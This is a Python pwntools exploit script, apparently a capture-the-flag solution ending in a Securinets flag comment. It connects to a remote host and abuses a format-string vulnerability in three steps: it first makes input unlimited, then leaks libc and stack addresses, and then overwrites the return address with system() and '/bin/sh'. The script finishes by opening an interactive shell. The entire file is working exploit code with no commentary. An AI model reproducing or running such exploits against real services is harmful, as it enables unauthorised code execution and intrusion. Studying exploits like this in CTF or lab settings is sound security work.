from pwn import *
elf = ELF('./main', checksec=False)
#libc = ELF('/usr/lib32/libc.so.6', checksec=False)
libc = ELF('libc6_2.30-0ubuntu2_i386.so', checksec=False)

#p = elf.process()
p = remote('54.225.38.91', 1026)

# make it unlimited
p.sendlineafter('name\n', p32(0x804c010) + '%6$n')

# leak
p.sendlineafter('name\n', '%2$p|%25$p')
leak =  p.recvline().strip().split('|')
# stack frame, return address
stack = eval(leak[1]) - 0x98
stack_arg = stack+0x8

leak = eval(leak[0])
libc.address = leak - libc.sym['_IO_2_1_stdin_']

ret_func = libc.sym['system']
bin_sh   = next(libc.search('/bin/sh'))

log.info('_IO_2_1_stdin_: 0x%x'%leak)
log.info('libc base     : 0x%x'%libc.address)
print()
log.info('ret_func      : 0x%x'%ret_func)
log.info('argv[1]       : 0x%x'%bin_sh)
print()
log.info('stack/ret     : 0x%x'%stack)
log.info('stack arg     : 0x%x'%stack_arg)

# overwrite return address
addr_1 = eval('0x' + hex(ret_func)[-2:])  
addr_2 = eval('0x' + hex(ret_func)[-6:-4] + hex(ret_func)[-4:-2])

payload = ''.join([
    p32(stack+0),
    p32(stack+1),

    '%{:d}x'.format(addr_1 - 0x8),'%6$hhn',
    '%{:d}x'.format(addr_2 - addr_1),'%7$hn',
])
p.sendlineafter('name\n', payload)

# overwrite next 8 address for args
addr_1 = eval('0x' + hex(bin_sh)[-4:-2] + hex(bin_sh)[-2:])  
addr_2 = eval('0x' + hex(bin_sh)[-8:-6] + hex(bin_sh)[-6:-4])

payload = ''.join([
    p32(stack_arg+0),
    p32(stack_arg+2),
    

    '%{:d}x'.format(addr_1 - 0x8),'%6$hn',
    '%{:d}x'.format(addr_2 - addr_1),'%7$hn',
])
p.sendlineafter('name\n', payload)
p.recvline()    # hide the buffer
p.interactive()
# securinets{fmt_fmt_3v3rywh3r3!!}